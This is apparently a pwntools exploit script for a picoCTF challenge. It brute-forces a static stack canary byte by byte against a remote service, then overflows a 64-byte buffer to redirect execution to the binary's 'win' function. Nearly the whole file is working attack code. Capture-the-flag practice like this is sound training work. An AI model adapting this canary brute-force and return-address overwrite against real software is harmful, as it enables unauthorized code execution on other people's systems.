from pwn import *
from string import printable

elf = context.binary = ELF('./vuln3', checksec=False)

host, port = 'saturn.picoctf.net', 61106

# In this case, the canary is a global variable
# which assigned after BUFFER size 64,
# so we set up a offset = 64
BUFFER_SIZE = 64

"""
Find offset to reach $eip through core dump

from pwn import *
elf = context.binary = ELF('./vuln3', checksec=False)
p = process(elf.path)

# In local environment, I created 'canary.txt' and canary is 'daab'
# payload will be BUFFER_SIZE + CANARY and padding, to find $eip offset
payload = cyclic(64) + b'daab' + cyclic(200)

# How Many Bytes will You Write Into the Buffer?
# BUFFER(64) + CANARY(4) + CYCLIC(200) = 268
p.sendline(b'268')
# Input
p.sendline(payload)

p.wait()    

# Now, the core file has already created.
# In my /proc/sys/kernel/core_pattern, core file will located in /tmp/core
core = Corefile([COREFILE])

# Find offset => 16
cycilc_find(core.eip)
"""
offset = 16


def start():
    if args.LOCAL:
        return process(elf.path)
    else:
        return remote(host, port)


def get_canary():
    canary = b''
    logger = log.progress("Finding canary...")

    # Start from offset, canary size is 4 bytes.
    for i in range(1, 5):
        for char in printable:
            # context.quiet disables all non-error logging within the enclosed scope,
            # unless the debugging levle is set to 'debug' or lower.
            with context.quiet:
                p = start()
                p.sendlineafter(b'> ', str(BUFFER_SIZE + i).encode())
                p.sendlineafter(b'> ', flat([{BUFFER_SIZE : canary}, char.encode()]))
                recv = p.recvall()

                if b'Stack Smashing' not in recv:
                    canary += char.encode()
                    logger.status(f'"{canary.decode()}"')
                    break
    logger.success(f'"{canary.decode()}')
    return canary

canary = get_canary()     
p = start()

payload = flat([
    {BUFFER_SIZE : canary}, 
    {offset : elf.symbols.win}
])
p.sendlineafter(b'> ', str(len(payload)).encode())
p.sendlineafter(b'> ', payload)

log.success(p.recvall().decode('ISO-8859-1'))

p.interactive()
